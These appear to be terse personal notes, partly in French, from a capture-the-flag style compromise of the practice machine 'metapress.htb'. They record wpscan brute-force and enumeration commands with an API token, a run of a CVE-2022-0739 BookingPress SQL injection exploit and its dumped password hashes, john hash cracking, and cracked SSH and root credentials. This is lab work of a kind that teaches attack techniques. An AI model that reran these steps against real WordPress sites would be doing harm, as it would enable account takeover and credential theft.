# 10.10.11.186

# http://metapress.htb/

# wordpress version
5.6.2

#user wordpress
admin
manager

# wpscan brute force
wpscan --url http://metapress.htb/ --passwords ../../../SecLists/Passwords/darkc0de.txt --usernames user.txt

# with API
wpscan --url http://metapress.htb --enumerate ap,at,u,tt --api-token odPqKoPU1sjABqeT5KaD1QjyBEQVh1z88hzOMsV2RCg

# lien interessant
http://metapress.htb/wp-admin/admin-ajax.php

# wpscan plugins detect
wpscan --url http://metapress.htb --enumerate --api-token odPqKoPU1sjABqeT5KaD1QjyBEQVh1z88hzOMsV2RCg -e at,ap --plugins-detection mixed


# json url
http://metapress.htb/wp-json/

# wpnonce value
49de241183

# CVE 2022-0739
python booking-press-expl.py -u 'http://metapress.htb/wp-admin/admin-ajax.php' -n 49de241183
- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|

# manager pass
john hash-manager --wordlist=../../../Downloads/rockyou.txt
result : partylikearockstar

# ssh conection
user : jnelson@metapress.htb
pass : Cb4_JmWM8zUZWMu@Ys

# root
5.10.0-19-amd64 #1 SMP Debian 5.10.149-2

pubring.kbx : KBXfcz�Ncz�N

# root
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
